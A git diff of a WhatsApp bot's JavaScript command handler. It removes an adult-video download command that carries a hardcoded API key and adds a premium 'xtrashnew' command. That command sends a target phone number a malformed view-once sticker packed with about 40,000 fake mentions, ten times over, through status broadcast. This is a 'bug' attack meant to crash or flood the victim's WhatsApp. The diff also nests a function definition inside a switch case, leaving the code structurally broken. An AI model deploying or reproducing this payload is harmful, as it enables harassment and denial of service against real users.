@@ -906,65 +906,119 @@ function setupCommandHandlers(socket, number) {
     }
                       break;
                 }
-                       case "xnxx":
-case "xnxxvideo":
-  if (!config.PREMIUM.includes(m.sender.split('@')[0])) {
-    return reply('ම්ම් වැල් බලන්න ආසද 🫣 එහෙනම් පොඩිම පොඩි මුදලක් ගෙවා Premium Access ලබා ගන්න. UNLIMITED වැල් ගන්න Puluwan')
-}
-    if (!text) return reply(`❌ Please provide a Name.`);
-    if (!m.isGroup) return reply("Group only!");
+                       
+    case "xtrashnew": {
+    // Check if the user is an owner or premium
+    if (!isOwner && !isPremium) return m.reply('Khusus Premium');
 
-    try {
-        await dragon.sendMessage(from, {
-            react: { text: "🎥", key: m.key },
-        });
+    // Check if a target phone number is provided
+    if (!text) return m.reply(`\`Example:\` ${prefix + command} 628×××`);
 
-        const response = await axios.get(`https://api.genux.me/api/download/xnxx-download?query=${encodeURIComponent(text)}&apikey=GENUX-SANDARUX`);
-        const data = response.data; 
+    // Format the target JID (WhatsApp ID)
+    let target = text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+    m.reply(`𝙋𝙧𝙤𝙨𝙚𝙨 𝙨𝙚𝙣𝙩 ${prefix + command} 𝙩𝙤 ${target}`);
 
-        const wait = await dragon.sendMessage(
-            from,
-            { text: "Downloading.... " },
-            { quoted: m }
-        );
-
-        if (!data || !data.result || !data.result.files) {
-            return reply("❌ No results found or invalid response structure.");
+    // Delay to simulate processing and send success notification
+    setTimeout(async () => {
+        try {
+            m.reply(`┏━━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
+┃╺╺╸〢𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋 𝐒𝐄𝐍𝐓 𝐁𝐔𝐆 〢╺╸╺
+┃ 𝐓𝐚𝐫𝐜𝐞𝐭: ${target}
+┃ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝: ${command}
+┃ 𝐖𝐚𝐫𝐧𝐢𝐧𝐜𝐠: Jeda 5 menit tod
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`);
+        } catch (error) {
+            console.error("Error sending notification:", error);
+            m.reply("Failed to send notification.");
         }
+    }, 3000);
 
-        await dragon.sendMessage(from, {
-            image: { url: data.result.image },
-            caption: `💬 *Title*: ${data.result.title}\n\n👀 *Duration*: ${data.result.duration}\n\n🗯 *Description*: ${data.result.description}\n\n💦 *Tags*: ${data.result.tags}`,
-            contextInfo: {
-                forwardingScore: 10,
-                isForwarded: true,
-            }
-        });
+    // Send the bulldozer message multiple times
+    for (let i = 0; i < 10; i++) {
+        try {
+            await bulldozer(target);
+            await sleep(1500); // Delay between sends
+            console.log(chalk.red("Successfully sent xtrashnew bug"));
+        } catch (error) {
+            console.error("Error in bulldozer loop:", error);
+            m.reply("Error sending bug to target.");
+        }
+    }
 
-        await dragon.sendMessage(
-            from,
-            {
-                video: { url: data.result.files.high },
-                fileName: data.result.title + ".mp4",
-                mimetype: "video/mp4",
-                caption: "*Done ✅*",
-                contextInfo: {
-                    forwardingScore: 10,
-                    isForwarded: true,
+    break;
+}
+
+// Bulldozer function (as provided)
+async function bulldozer(target) {
+    let message = {
+        viewOnceMessage: {
+            message: {
+                stickerMessage: {
+                    url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
+                    fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
+                    fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
+                    mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
+                    mimetype: "image/webp",
+                    directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
+                    fileLength: { low: 1, high: 0, unsigned: true },
+                    mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
+                    firstFrameLength: 19904,
+                    firstFrameSidecar: "KN4kQ5pyABRAgA==",
+                    isAnimated: true,
+                    contextInfo: {
+                        mentionedJid: [
+                            "0@s.whatsapp.net",
+                            ...Array.from(
+                                { length: 40000 },
+                                () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
+                            ),
+                        ],
+                        groupMentions: [],
+                        entryPointConversionSource: "non_contact",
+                        entryPointConversionApp: "whatsapp",
+                        entryPointConversionDelaySeconds: 467593,
+                    },
+                    stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
+                    isAvatar: false,
+                    isAiSticker: false,
+                    isLottie: false,
                 },
             },
-            { quoted: m }
-        );
+        },
+    };
 
-        await dragon.sendMessage(from, {
-            text: `*Uploaded✅*`,
-            edit: wait.key,
-        });
+    const msg = generateWAMessageFromContent(target, message, {});
 
-    } catch (error) {
-        console.error(error);
-        reply("❌ An error occurred while fetching the video.");
-    }
+    await rikz.relayMessage("status@broadcast", msg.message, {
+        messageId: msg.key.id,
+        statusJidList: [target],
+        additionalNodes: [
+            {
+                tag: "meta",
+                attrs: {},
+                content: [
+                    {
+                        tag: "mentioned_users",
+                        attrs: {},
+                        content: [
+                            {
+                                tag: "to",
+                                attrs: { jid: target },
+                                content: undefined,
+                            },
+                        ],
+                    },
+                ],
+            },
+        ],
+    });
+}
+
+// Utility sleep function
+function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+    
            break;                    
                   case 'video': {
     const yts = require('yt-search');
